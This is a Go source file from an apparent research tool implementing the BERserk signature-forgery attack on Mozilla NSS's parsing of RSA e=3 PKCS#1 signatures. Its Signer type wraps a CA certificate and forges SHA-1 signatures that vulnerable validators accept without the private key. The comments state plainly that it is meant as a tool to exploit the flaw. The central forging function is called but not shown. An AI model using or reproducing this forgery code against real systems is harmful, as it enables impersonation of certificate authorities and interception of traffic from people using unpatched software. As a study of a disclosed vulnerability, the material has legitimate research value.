// A Go implementation of the BERserk attack against Mozilla NSS ASN.1 parsing
// of PKCS#1 RSA signatures with e = 3.
//
// BERserk was big but it happened on the same day as ShellShock and no one
// noticed. So much that there isn't neither a live test for it nor a tool to
// exploit it. So here we are.
//
// See also https://github.com/FiloSottile/BERserk/blob/master/README.md
package BERserk

import (
	"crypto"
	"crypto/rsa"
	"crypto/x509"
	"errors"
	"io"
)

// Signer is a crypto.Signer that given a x509.Certificate with a RSA public key
// with e = 3 and length 1024 or 2048, will generate PKCS#1 signatures that
// exploit BERserk without knowledge of the private key.
type Signer struct {
	publicKey *rsa.PublicKey
}

// New will return a new Signer that generates signatures that will look valid
// for the given CA certificate.
//
// ca must have a RSA key with length 1024 or 2048 and exponent 3.
func New(ca *x509.Certificate) (*Signer, x509.SignatureAlgorithm, error) {
	if ca.PublicKeyAlgorithm != x509.RSA {
		return nil, 0, errors.New("only RSA is supported")
	}

	pub, ok := ca.PublicKey.(*rsa.PublicKey)
	if !ok {
		return nil, 0, errors.New("failed to get certificate RSA key")
	}

	if pub.E != 3 {
		return nil, 0, errors.New("only RSA e = 3 is supported")
	}

	if pub.N.BitLen() != 1024 && pub.N.BitLen() != 2048 {
		return nil, 0, errors.New("unsupported public key length")
	}

	return &Signer{publicKey: pub}, x509.SHA1WithRSA, nil
}

// Public returns the Signer's CA RSA public key
func (s *Signer) Public() crypto.PublicKey {
	return s.publicKey
}

// Sign will generate a PKCS#1 signature of msg that will be accepted as valid
// by BERserk affected validators.
//
// ErrRetry is returned when a signature can't be generated for the specific
// input. Change a variable field (i.e. serial number) in the message and retry.
//
// rand is ignored and can be nil.
// Only opts.HashFunc() == crypto.SHA1 is supported.
func (s *Signer) Sign(rand io.Reader, msg []byte, opts crypto.SignerOpts) (signature []byte, err error) {
	if opts.HashFunc() != crypto.SHA1 {
		return nil, errors.New("wrong opts.HashFunc()")
	}

	return SignPKCS1v15(s.publicKey.N.BitLen(), opts.HashFunc(), msg)
}
